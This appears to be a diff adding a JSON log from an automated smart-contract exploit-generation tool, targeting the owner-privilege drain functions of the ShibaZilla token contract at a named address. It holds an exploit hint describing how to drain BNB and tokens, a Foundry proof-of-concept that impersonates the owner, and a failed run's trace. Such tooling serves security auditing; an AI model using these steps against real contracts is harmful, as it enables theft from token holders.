@@ -1,0 +1,60 @@
+{
+  "project_id": "ShibaZilla_AuditReport_InterFi",
+  "target_address": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+  "finding_id": 0,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner or have been authorized by the owner",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner or authorized address, call clearStuckBalance_sender(100) to drain all BNB from the contract to your address. Alternatively, use rescueToken to steal any ERC20 tokens held by the contract. The owner can also manipulate fees, tax settings, and rebase functions to extract value from holders."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Minimal interface for the functions we need\ninterface ShibZilla {\n    function getOwner() external view returns (address);\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function rescueToken(address tokenAddress, uint256 tokens) external returns (bool success);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate the owner directly\n        // The test framework already defines TARGET and attacker variables\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // First, let's get the current owner of the contract\n        ShibZilla target = ShibZilla(TARGET);\n        address owner = target.getOwner();\n        \n        // Send some BNB to the contract so it has something to drain\n        deal(TARGET, 10 ether);\n        \n        // Record initial balance of attacker\n        uint256 initialBalance = address(this).balance;\n        \n        // Impersonate the owner to call the privileged function\n        vm.prank(owner);\n        target.clearStuckBalance_sender(100);\n        \n        // Verify our balance increased\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The contract has owner privilege abuse vulnerabilities in the clearStuckBalance_sender() and rescueToken() functions. These functions allow authorized addresses (owner or authorized users) to drain BNB and ERC20 tokens from the contract. The clearStuckBalance_sender(100) function transfers 100% of the contract's BNB balance to the caller, enabling complete drainage of native tokens.",
+      "attack_strategy": "Impersonate the contract owner to gain authorized status, then call clearStuckBalance_sender(100) to drain all BNB from the contract to the attacker's address.",
+      "step_by_step_plan": "1. Use vm.prank() to impersonate the contract owner\n2. Ensure the contract has BNB balance (we can send some BNB to it first)\n3. Call clearStuckBalance_sender(100) to drain all BNB\n4. Verify the attacker's balance increased",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// Minimal interface for the functions we need\ninterface ShibZilla {\n    function getOwner() external view returns (address);\n    function clearStuckBalance_sender(uint256 amountPercentage) external;\n    function rescueToken(address tokenAddress, uint256 tokens) external returns (bool success);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;\n    address attacker = address(this);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate the owner directly\n        // The test framework already defines TARGET and attacker variables\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // First, let's get the current owner of the contract\n        ShibZilla target = ShibZilla(TARGET);\n        address owner = target.getOwner();\n        \n        // Send some BNB to the contract so it has something to drain\n        deal(TARGET, 10 ether);\n        \n        // Record initial balance of attacker\n        uint256 initialBalance = address(this).balance;\n        \n        // Impersonate the owner to call the privileged function\n        vm.prank(owner);\n        target.clearStuckBalance_sender(100);\n        \n        // Verify our balance increased\n        uint256 finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "Economic Exploit Failed: No profit: 79228162514264337593543950335 <= 79228162514264337593543950335",
+        "location": null,
+        "raw_snippet": "    ├─ [0] VM::prank(0xca07Df2Cbe0d98073e870b4325E969256924dd0f)\n    │   └─ ← [Return]\n    ├─ [12145] ShibZilla::clearStuckBalance_sender(100)\n    │   ├─ [55] 0xca07Df2Cbe0d98073e870b4325E969256924dd0f::fallback{value: 10000000000000000000}()\n    │   │   └─ ← [Stop]\n    │   └─ ← [Stop]\n    ├─ [0] VM::assertGt(79228162514264337593543950335 [7.922e28], 79228162514264337593543950335 [7.922e28], \"Economic Exploit Failed: No profit\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: Economic Exploit Failed: No profit: 79228162514264337593543950335 <= 79228162514264337593543950335"
+      },
+      "feedback": "EVM Revert: Economic Exploit Failed: No profit: 79228162514264337593543950335 <= 79228162514264337593543950335。请调整参数或调用路径。",
+      "duration_seconds": 47.371031045913696,
+      "prompt_tokens": 16030,
+      "completion_tokens": 1229,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 47.374062061309814,
+  "total_prompt_tokens": 16030,
+  "total_completion_tokens": 1229,
+  "total_cost": 0.0
+}
